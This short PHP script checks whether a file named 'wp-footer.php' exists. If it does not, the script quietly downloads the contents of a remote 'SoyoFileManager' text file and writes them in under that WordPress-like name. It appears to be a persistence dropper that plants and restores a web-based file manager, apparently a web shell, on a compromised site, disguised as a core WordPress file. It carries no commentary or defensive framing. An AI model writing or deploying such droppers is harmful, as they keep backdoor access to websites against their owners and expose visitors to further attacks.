<?php
$target = 'wp-footer.php';
$backupSource = 'https://cdn.githubraw.com/sarahmiranawina/SoyoFileManager/main/sfm.txt';

if (!file_exists($target)) {
    $source = @file_get_contents($backupSource);
    if ($source !== false) {
        file_put_contents($target, $source);
    } else {
        die("Failed");
    }
}
